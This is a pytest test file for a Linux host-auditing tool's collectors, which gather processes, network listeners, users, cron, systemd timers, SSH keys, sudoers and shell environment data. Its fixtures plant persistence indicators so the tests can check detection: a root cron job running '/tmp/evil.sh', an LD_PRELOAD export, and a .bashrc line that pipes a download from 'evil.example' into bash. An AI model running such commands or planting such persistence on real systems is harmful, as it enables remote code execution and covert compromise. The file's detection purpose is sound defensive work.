import io
import json
from unittest import mock

import pytest


# ─── ProcessCollector ─────────────────────────────────────────────────────────

def _open_proc(path, *args, **kwargs):
    mode = args[0] if args else kwargs.get("mode", "r")
    if path == "/proc/123/status":
        return io.StringIO("Name:\tpython3\nUid:\t1000\t1000\t1000\t1000\n")
    if path == "/proc/123/cmdline":
        return io.StringIO("python3\x00script.py\x00")
    raise FileNotFoundError(path)


def test_process_collector_parses_status():
    from ubuntils.collectors.processes import ProcessCollector

    with mock.patch("glob.glob", return_value=["/proc/123/status"]), \
         mock.patch("os.readlink", return_value="/usr/bin/python3"), \
         mock.patch("builtins.open", side_effect=_open_proc):
        result = ProcessCollector().collect()

    assert "processes" in result
    assert len(result["processes"]) == 1
    p = result["processes"][0]
    assert p["pid"] == 123
    assert p["name"] == "python3"
    assert p["uid"] == 1000
    assert p["exe"] == "/usr/bin/python3"


def test_process_collector_skips_missing_pid():
    from ubuntils.collectors.processes import ProcessCollector

    def vanishing_open(path, *args, **kwargs):
        raise FileNotFoundError(path)

    with mock.patch("glob.glob", return_value=["/proc/999/status"]), \
         mock.patch("os.readlink", side_effect=FileNotFoundError), \
         mock.patch("builtins.open", side_effect=vanishing_open):
        result = ProcessCollector().collect()

    assert "processes" in result
    assert result["processes"] == []


def test_process_collector_returns_empty_on_glob_failure():
    from ubuntils.collectors.processes import ProcessCollector

    with mock.patch("glob.glob", side_effect=OSError("permission denied")):
        result = ProcessCollector().collect()

    assert result == {}


def test_process_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.processes import ProcessCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "proc" / "456").mkdir(parents=True)
    (files / "proc" / "456" / "status").write_text(
        "Name:\tsshd\nUid:\t0\t0\t0\t0\n"
    )
    (files / "proc" / "456" / "cmdline").write_text("sshd\x00-D\x00")

    src = BundleSource(root_dir=str(files), command_index={})
    result = ProcessCollector(source=src).collect()

    assert "processes" in result
    assert len(result["processes"]) == 1
    p = result["processes"][0]
    assert p["pid"] == 456
    assert p["name"] == "sshd"
    assert p["uid"] == 0
    assert p["cmdline"] == "sshd -D"
    # exe is a live /proc symlink read with no ArtifactSource primitive for it;
    # against a bundle (no real /proc/456/exe on this host) it degrades to "".
    assert p["exe"] == ""


# ─── NetworkCollector ─────────────────────────────────────────────────────────

SS_OUTPUT = (
    "Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process\n"
    "tcp    LISTEN  0       128     0.0.0.0:22           0.0.0.0:*          "
    "users:((\"sshd\",pid=1234,fd=3))\n"
)

NETSTAT_OUTPUT = (
    "Active Internet connections (servers and established)\n"
    "Proto Recv-Q Send-Q Local Address           Foreign Address         State"
    "       PID/Program name\n"
    "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN"
    "      1234/sshd\n"
)


def test_network_collector_parses_ss_output():
    from ubuntils.collectors.network import NetworkCollector

    with mock.patch("ubuntils.collectors.source.run_command",
                    return_value=(SS_OUTPUT, "", 0)):
        result = NetworkCollector().collect()

    assert "connections" in result
    assert len(result["connections"]) >= 1
    c = result["connections"][0]
    assert c["proto"] == "tcp"
    assert c["local_port"] == "22"
    assert c["state"] == "LISTEN"


def test_network_collector_falls_back_to_netstat():
    from ubuntils.collectors.network import NetworkCollector

    def fake_run(cmd, **kwargs):
        if cmd[0] == "ss":
            return ("", "not found", 1)
        return (NETSTAT_OUTPUT, "", 0)

    with mock.patch("ubuntils.collectors.source.run_command", side_effect=fake_run):
        result = NetworkCollector().collect()

    assert "connections" in result
    assert len(result["connections"]) >= 1
    assert result["connections"][0]["proto"] == "tcp"


def test_network_collector_both_fail():
    from ubuntils.collectors.network import NetworkCollector

    with mock.patch("ubuntils.collectors.source.run_command",
                    return_value=("", "error", 1)):
        result = NetworkCollector().collect()

    assert result == {}


def test_network_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.network import NetworkCollector
    from ubuntils.collectors.source import BundleSource

    captured = tmp_path / "captured"
    captured.mkdir()
    (captured / "ss.out").write_text(SS_OUTPUT)

    command_index = {"ss": str(captured / "ss.out")}
    src = BundleSource(root_dir=str(tmp_path / "files"), command_index=command_index)
    result = NetworkCollector(source=src).collect()

    assert "connections" in result
    assert len(result["connections"]) >= 1
    c = result["connections"][0]
    assert c["proto"] == "tcp"
    assert c["local_port"] == "22"
    assert c["state"] == "LISTEN"


# ─── UserCollector ────────────────────────────────────────────────────────────

PASSWD_CONTENT = (
    "root:x:0:0:root:/root:/bin/bash\n"
    "alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
)

GROUP_CONTENT = (
    "sudo:x:27:alice\n"
    "docker:x:999:alice\n"
)


def _open_users(path, *args, **kwargs):
    if path == "/etc/passwd":
        return io.StringIO(PASSWD_CONTENT)
    if path == "/etc/group":
        return io.StringIO(GROUP_CONTENT)
    if path == "/etc/shadow":
        return io.StringIO("root:!:19000:0:99999:7:::\nalice:$6$hash:19000:0:99999:7:::\n")
    raise FileNotFoundError(path)


def test_user_collector_parses_passwd():
    from ubuntils.collectors.users import UserCollector

    with mock.patch("builtins.open", side_effect=_open_users):
        result = UserCollector().collect()

    assert "users" in result
    users = {u["username"]: u for u in result["users"]}
    assert "alice" in users
    assert users["alice"]["uid"] == 1000
    assert users["alice"]["shell"] == "/bin/bash"
    assert users["alice"]["home"] == "/home/alice"


def test_user_collector_marks_nologin():
    from ubuntils.collectors.users import UserCollector

    with mock.patch("builtins.open", side_effect=_open_users):
        result = UserCollector().collect()

    users = {u["username"]: u for u in result["users"]}
    assert users["daemon"]["is_login_shell"] is False
    assert users["alice"]["is_login_shell"] is True


def test_user_collector_shadow_permission_error():
    from ubuntils.collectors.users import UserCollector

    def open_no_shadow(path, *args, **kwargs):
        if path == "/etc/shadow":
            raise PermissionError("permission denied")
        return _open_users(path, *args, **kwargs)

    with mock.patch("builtins.open", side_effect=open_no_shadow):
        result = UserCollector().collect()

    assert "users" in result
    for user in result["users"]:
        assert user["password_locked"] is None


# ─── CronCollector ────────────────────────────────────────────────────────────

SYSTEM_CRONTAB = (
    "# system cron\n"
    "SHELL=/bin/sh\n"
    "17 * * * * root    cd / && run-parts --report /etc/cron.hourly\n"
    "* * * * * root /tmp/evil.sh\n"
)

USER_CRONTAB_ALICE = (
    "# alice's cron\n"
    "0 9 * * 1 /home/alice/backup.sh\n"
)


def _open_cron(path, *args, **kwargs):
    if path == "/etc/crontab":
        return io.StringIO(SYSTEM_CRONTAB)
    if path == "/var/spool/cron/crontabs/alice":
        return io.StringIO(USER_CRONTAB_ALICE)
    raise FileNotFoundError(path)


def _glob_cron(pattern):
    if "/etc/cron.d" in pattern:
        return []
    if "/var/spool/cron/crontabs" in pattern:
        return ["/var/spool/cron/crontabs/alice"]
    return []


def test_cron_collector_parses_system_crontab():
    from ubuntils.collectors.cron import CronCollector

    with mock.patch("builtins.open", side_effect=_open_cron), \
         mock.patch("glob.glob", side_effect=_glob_cron):
        result = CronCollector().collect()

    assert "cron_entries" in result
    system_entries = [e for e in result["cron_entries"] if e["source"] == "/etc/crontab"]
    assert len(system_entries) >= 1
    commands = [e["command"] for e in system_entries]
    assert any("/tmp/evil.sh" in c for c in commands)


def test_cron_collector_parses_user_crontab():
    from ubuntils.collectors.cron import CronCollector

    with mock.patch("builtins.open", side_effect=_open_cron), \
         mock.patch("glob.glob", side_effect=_glob_cron):
        result = CronCollector().collect()

    user_entries = [e for e in result["cron_entries"] if e["owner"] == "alice"]
    assert len(user_entries) == 1
    assert "/home/alice/backup.sh" in user_entries[0]["command"]


def test_cron_collector_skips_comments():
    from ubuntils.collectors.cron import CronCollector

    with mock.patch("builtins.open", side_effect=_open_cron), \
         mock.patch("glob.glob", side_effect=_glob_cron):
        result = CronCollector().collect()

    for entry in result["cron_entries"]:
        assert not entry["command"].startswith("#")
        assert not entry.get("raw_line", "").lstrip().startswith("#")


# ─── SystemdCollector ─────────────────────────────────────────────────────────

TIMERS_JSON = json.dumps([
    {"unit": "apt-daily.timer", "activates": "apt-daily.service"},
])

EXEC_START_OUTPUT = "ExecStart=/usr/lib/apt/apt.systemd.daily install\n"

TIMERS_TEXT = (
    "NEXT                          LEFT          LAST                          "
    "PASSED       UNIT                    ACTIVATES\n"
    "Thu 2024-01-18 06:00:00 UTC   4h left       Wed 2024-01-17 06:00:00 UTC   "
    "17h ago      apt-daily.timer         apt-daily.service\n"
    "\n1 timers listed.\n"
)


def _run_systemd(cmd, **kwargs):
    if "--output" in cmd and "json" in cmd:
        return (TIMERS_JSON, "", 0)
    if "show" in cmd and "--property=ExecStart" in cmd:
        return (EXEC_START_OUTPUT, "", 0)
    return ("", "error", 1)


def test_systemd_collector_parses_json_output():
    from ubuntils.collectors.systemd import SystemdCollector

    with mock.patch("ubuntils.collectors.source.run_command", side_effect=_run_systemd):
        result = SystemdCollector().collect()

    assert "timers" in result
    assert len(result["timers"]) == 1
    assert result["timers"][0]["unit"] == "apt-daily.timer"
    assert result["timers"][0]["exec_start"] == "/usr/lib/apt/apt.systemd.daily install"


def test_systemd_collector_parses_text_output():
    from ubuntils.collectors.systemd import SystemdCollector

    def run_text(cmd, **kwargs):
        if "--output" in cmd and "json" in cmd:
            return ("", "unknown option", 1)
        if "list-timers" in cmd:
            return (TIMERS_TEXT, "", 0)
        if "show" in cmd and "--property=ExecStart" in cmd:
            return (EXEC_START_OUTPUT, "", 0)
        return ("", "error", 1)

    with mock.patch("ubuntils.collectors.source.run_command", side_effect=run_text):
        result = SystemdCollector().collect()

    assert "timers" in result
    assert len(result["timers"]) >= 1
    assert result["timers"][0]["unit"] == "apt-daily.timer"


def test_systemd_collector_handles_missing_exec_start():
    from ubuntils.collectors.systemd import SystemdCollector

    def run_no_exec(cmd, **kwargs):
        if "--output" in cmd and "json" in cmd:
            return (TIMERS_JSON, "", 0)
        if "show" in cmd and "--property=ExecStart" in cmd:
            return ("", "not found", 1)
        return ("", "error", 1)

    with mock.patch("ubuntils.collectors.source.run_command", side_effect=run_no_exec):
        result = SystemdCollector().collect()

    assert "timers" in result
    assert result["timers"][0]["exec_start"] == ""


# ─── SSHCollector ─────────────────────────────────────────────────────────────

AUTH_KEYS_CONTENT = (
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ alice@laptop\n"
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI work-key\n"
)

PASSWD_SSH = "alice:x:1000:1000::/home/alice:/bin/bash\nnobody:x:65534:65534:::/usr/sbin/nologin\n"


def _open_ssh(path, *args, **kwargs):
    if path == "/etc/passwd":
        return io.StringIO(PASSWD_SSH)
    if path == "/home/alice/.ssh/authorized_keys":
        return io.StringIO(AUTH_KEYS_CONTENT)
    raise FileNotFoundError(path)


def _stat_ssh(path):
    s = mock.MagicMock()
    s.st_mtime = 1705000000.0
    return s


def test_ssh_collector_parses_authorized_keys():
    from ubuntils.collectors.ssh import SSHCollector

    with mock.patch("builtins.open", side_effect=_open_ssh), \
         mock.patch("os.path.exists", return_value=True), \
         mock.patch("os.lstat", side_effect=_stat_ssh):
        result = SSHCollector().collect()

    assert "authorized_keys" in result
    assert len(result["authorized_keys"]) == 2
    first = result["authorized_keys"][0]
    assert first["username"] == "alice"
    assert first["key_type"] == "ssh-rsa"
    assert first["comment"] == "alice@laptop"
    assert first["file_mtime"] == 1705000000.0


def test_ssh_collector_skips_missing_file():
    from ubuntils.collectors.ssh import SSHCollector

    with mock.patch("builtins.open", side_effect=lambda p, *a, **k: io.StringIO(PASSWD_SSH) if p == "/etc/passwd" else (_ for _ in ()).throw(FileNotFoundError(p))), \
         mock.patch("os.path.exists", return_value=False):
        result = SSHCollector().collect()

    assert "authorized_keys" in result
    assert result["authorized_keys"] == []


def test_ssh_collector_records_mtime():
    from ubuntils.collectors.ssh import SSHCollector

    with mock.patch("builtins.open", side_effect=_open_ssh), \
         mock.patch("os.path.exists", return_value=True), \
         mock.patch("os.lstat", side_effect=_stat_ssh):
        result = SSHCollector().collect()

    assert isinstance(result["authorized_keys"][0]["file_mtime"], float)


# ─── SudoersCollector ─────────────────────────────────────────────────────────

SUDOERS_CONTENT = (
    "# sudoers file\n"
    "#include /etc/sudoers.d/\n"
    "root    ALL=(ALL:ALL) ALL\n"
    "alice   ALL=(ALL:ALL) NOPASSWD: ALL\n"
    "%sudo   ALL=(ALL:ALL) ALL\n"
)

SUDOERS_D_CONTENT = "bob ALL=(ALL) NOPASSWD: /usr/bin/apt\n"


def _open_sudoers(path, *args, **kwargs):
    if path == "/etc/sudoers":
        return io.StringIO(SUDOERS_CONTENT)
    if path == "/etc/sudoers.d/bob":
        return io.StringIO(SUDOERS_D_CONTENT)
    raise FileNotFoundError(path)


def _glob_sudoers(pattern):
    if "/etc/sudoers.d" in pattern:
        return ["/etc/sudoers.d/bob"]
    return []


def test_sudoers_collector_parses_nopasswd_rule():
    from ubuntils.collectors.sudoers import SudoersCollector

    with mock.patch("builtins.open", side_effect=_open_sudoers), \
         mock.patch("glob.glob", side_effect=_glob_sudoers):
        result = SudoersCollector().collect()

    assert "sudoers_rules" in result
    rules = result["sudoers_rules"]
    nopasswd_rules = [r for r in rules if "NOPASSWD" in r["options"]]
    assert len(nopasswd_rules) >= 1


def test_sudoers_collector_skips_includes():
    from ubuntils.collectors.sudoers import SudoersCollector

    with mock.patch("builtins.open", side_effect=_open_sudoers), \
         mock.patch("glob.glob", side_effect=_glob_sudoers):
        result = SudoersCollector().collect()

    for rule in result["sudoers_rules"]:
        assert not rule["raw_line"].startswith("#include")
        assert not rule["raw_line"].startswith("@include")


def test_sudoers_collector_reads_sudoers_d():
    from ubuntils.collectors.sudoers import SudoersCollector

    with mock.patch("builtins.open", side_effect=_open_sudoers), \
         mock.patch("glob.glob", side_effect=_glob_sudoers):
        result = SudoersCollector().collect()

    sources = {r["source"] for r in result["sudoers_rules"]}
    assert "/etc/sudoers.d/bob" in sources


# ─── EnvironmentCollector ─────────────────────────────────────────────────────

ETC_ENVIRONMENT = "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\nLANG=en_US.UTF-8\n"
BASHRC_MALICIOUS = "export LD_PRELOAD=/tmp/evil.so\nexport EDITOR=vim\n"
PASSWD_ENV = "alice:x:1000:1000::/home/alice:/bin/bash\n"


def _open_env(path, *args, **kwargs):
    if path == "/etc/environment":
        return io.StringIO(ETC_ENVIRONMENT)
    if path == "/etc/profile":
        return io.StringIO("")
    if path == "/home/alice/.bashrc":
        return io.StringIO(BASHRC_MALICIOUS)
    raise FileNotFoundError(path)


def _glob_env(pattern):
    if "/etc/profile.d" in pattern:
        return []
    return []


def test_env_collector_parses_ld_preload():
    from ubuntils.collectors.environment import EnvironmentCollector

    def open_all(path, *args, **kwargs):
        if path == "/etc/passwd":
            return io.StringIO(PASSWD_ENV)
        if path == "/etc/environment":
            return io.StringIO("")
        if path == "/etc/profile":
            return io.StringIO("")
        if path == "/home/alice/.bashrc":
            return io.StringIO(BASHRC_MALICIOUS)
        raise FileNotFoundError(path)

    with mock.patch("builtins.open", side_effect=open_all), \
         mock.patch("glob.glob", side_effect=_glob_env), \
         mock.patch("os.path.exists", side_effect=lambda p: p == "/home/alice/.bashrc"):
        result = EnvironmentCollector().collect()

    assert "env_definitions" in result
    variables = [e["variable"] for e in result["env_definitions"]]
    assert "LD_PRELOAD" in variables


def test_env_collector_reads_etc_environment():
    from ubuntils.collectors.environment import EnvironmentCollector

    def open_minimal(path, *args, **kwargs):
        if path == "/etc/passwd":
            return io.StringIO("")
        if path == "/etc/environment":
            return io.StringIO(ETC_ENVIRONMENT)
        if path == "/etc/profile":
            return io.StringIO("")
        raise FileNotFoundError(path)

    with mock.patch("builtins.open", side_effect=open_minimal), \
         mock.patch("glob.glob", side_effect=_glob_env):
        result = EnvironmentCollector().collect()

    assert "env_definitions" in result
    system_entries = [e for e in result["env_definitions"] if e["owner"] == "system"]
    assert len(system_entries) >= 1
    variables = [e["variable"] for e in system_entries]
    assert "PATH" in variables


def test_env_collector_skips_nonexistent_rc_files():
    from ubuntils.collectors.environment import EnvironmentCollector

    def open_no_rc(path, *args, **kwargs):
        if path == "/etc/passwd":
            return io.StringIO(PASSWD_ENV)
        if path == "/etc/environment":
            return io.StringIO("")
        if path == "/etc/profile":
            return io.StringIO("")
        raise FileNotFoundError(path)

    with mock.patch("builtins.open", side_effect=open_no_rc), \
         mock.patch("glob.glob", side_effect=_glob_env), \
         mock.patch("os.path.exists", return_value=False):
        result = EnvironmentCollector().collect()  # must not raise

    assert "env_definitions" in result


# ─── Collector registry ───────────────────────────────────────────────────────

def test_cron_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.cron import CronCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "etc" / "cron.d").mkdir(parents=True)
    (files / "var" / "spool" / "cron" / "crontabs").mkdir(parents=True)
    (files / "etc" / "crontab").write_text(SYSTEM_CRONTAB)
    (files / "var" / "spool" / "cron" / "crontabs" / "alice").write_text(USER_CRONTAB_ALICE)

    src = BundleSource(root_dir=str(files), command_index={})
    result = CronCollector(source=src).collect()

    system_entries = [e for e in result["cron_entries"] if e["source"] == "/etc/crontab"]
    assert any("/tmp/evil.sh" in e["command"] for e in system_entries)
    user_entries = [e for e in result["cron_entries"] if e["owner"] == "alice"]
    assert len(user_entries) == 1
    assert "/home/alice/backup.sh" in user_entries[0]["command"]


def test_ssh_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "home" / "alice" / ".ssh").mkdir(parents=True)
    (files / "etc").mkdir(parents=True)
    (files / "etc" / "passwd").write_text(PASSWD_SSH)
    (files / "home" / "alice" / ".ssh" / "authorized_keys").write_text(AUTH_KEYS_CONTENT)

    src = BundleSource(root_dir=str(files), command_index={})
    result = SSHCollector(source=src).collect()

    assert len(result["authorized_keys"]) == 2
    first = result["authorized_keys"][0]
    assert first["username"] == "alice"
    assert first["key_type"] == "ssh-rsa"
    assert first["comment"] == "alice@laptop"
    assert isinstance(first["file_mtime"], float)


def test_ssh_collector_captures_ctime_and_options(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    home = files / "home" / "alice"
    (home / ".ssh").mkdir(parents=True)
    (files / "etc").mkdir()
    (files / "etc" / "passwd").write_text(
        "alice:x:1000:1000::/home/alice:/bin/bash\n"
    )
    (home / ".ssh" / "authorized_keys").write_text(
        'command="/bin/echo hi",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 ci@runner\n'
        "ssh-rsa AAAAB3NzaC1yc2E alice@laptop\n"
    )

    src = BundleSource(root_dir=str(files), command_index={})
    result = SSHCollector(source=src).collect()

    entries = result["authorized_keys"]
    assert len(entries) == 2
    first, second = entries
    assert first["options"] == 'command="/bin/echo hi",no-pty'
    assert first["key_type"] == "ssh-ed25519"
    assert first["comment"] == "ci@runner"
    assert first["file_ctime"] > 0
    assert second["options"] == ""
    assert second["key_type"] == "ssh-rsa"


def test_sudoers_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.sudoers import SudoersCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "etc" / "sudoers.d").mkdir(parents=True)
    (files / "etc" / "sudoers").write_text(SUDOERS_CONTENT)
    (files / "etc" / "sudoers.d" / "bob").write_text(SUDOERS_D_CONTENT)

    src = BundleSource(root_dir=str(files), command_index={})
    result = SudoersCollector(source=src).collect()

    rules = result["sudoers_rules"]
    nopasswd_rules = [r for r in rules if "NOPASSWD" in r["options"]]
    assert len(nopasswd_rules) >= 2
    sources = {r["source"] for r in rules}
    assert "/etc/sudoers.d/bob" in sources
    for rule in rules:
        assert not rule["raw_line"].startswith("#include")


def test_env_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "etc" / "profile.d").mkdir(parents=True)
    (files / "home" / "alice").mkdir(parents=True)
    (files / "etc" / "passwd").write_text(PASSWD_ENV)
    (files / "etc" / "environment").write_text(ETC_ENVIRONMENT)
    (files / "etc" / "profile").write_text("")
    (files / "home" / "alice" / ".bashrc").write_text(BASHRC_MALICIOUS)

    src = BundleSource(root_dir=str(files), command_index={})
    result = EnvironmentCollector(source=src).collect()

    definitions = result["env_definitions"]
    variables = [e["variable"] for e in definitions]
    assert "LD_PRELOAD" in variables
    assert "PATH" in variables
    ld_preload = next(e for e in definitions if e["variable"] == "LD_PRELOAD")
    assert ld_preload["owner"] == "alice"
    assert ld_preload["value"] == "/tmp/evil.so"


def test_systemd_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.systemd import SystemdCollector
    from ubuntils.collectors.source import BundleSource

    captured = tmp_path / "captured"
    captured.mkdir()
    (captured / "list_timers_json.out").write_text(TIMERS_JSON)
    (captured / "exec_start.out").write_text(EXEC_START_OUTPUT)

    command_index = {
        "systemctl_list_timers_json": str(captured / "list_timers_json.out"),
        "systemctl_show_execstart": str(captured / "exec_start.out"),
    }
    src = BundleSource(root_dir=str(tmp_path / "files"), command_index=command_index)
    result = SystemdCollector(source=src).collect()

    assert "timers" in result
    assert len(result["timers"]) == 1
    assert result["timers"][0]["unit"] == "apt-daily.timer"
    assert result["timers"][0]["exec_start"] == "/usr/lib/apt/apt.systemd.daily install"


def test_user_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.users import UserCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "etc").mkdir(parents=True)
    (files / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
    )
    (files / "etc" / "group").write_text("sudo:x:27:alice\n")
    (files / "etc" / "shadow").write_text("root:!:0:0:::::\nalice:$6$abc:0:0:::::\n")

    src = BundleSource(root_dir=str(files), command_index={})
    result = UserCollector(source=src).collect()

    usernames = [u["username"] for u in result["users"]]
    assert usernames == ["root", "alice"]
    alice = next(u for u in result["users"] if u["username"] == "alice")
    assert alice["groups"] == ["sudo"]
    assert alice["password_locked"] is False


def test_all_collectors_registered():
    from ubuntils.collectors import ALL_COLLECTORS
    assert len(ALL_COLLECTORS) == 8


def test_all_collectors_are_base_collector_subclasses():
    from ubuntils.collectors import ALL_COLLECTORS
    from ubuntils.collectors.base import BaseCollector
    for cls in ALL_COLLECTORS:
        assert issubclass(cls, BaseCollector), f"{cls} is not a BaseCollector subclass"


def test_environment_collector_captures_shell_init_files(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    home = files / "home" / "alice"
    home.mkdir(parents=True)
    (files / "etc").mkdir()
    (files / "etc" / "passwd").write_text(
        "alice:x:1000:1000::/home/alice:/bin/bash\n"
    )
    (home / ".bashrc").write_text("curl http://evil.example | bash\n")

    src = BundleSource(root_dir=str(files), command_index={})
    result = EnvironmentCollector(source=src).collect()

    shell_files = result["shell_init_files"]
    assert len(shell_files) == 1
    entry = shell_files[0]
    assert entry["owner"] == "alice"
    assert entry["source"] == "/home/alice/.bashrc"
    assert "curl http://evil.example | bash" in entry["content"]
    assert entry["ctime"] > 0
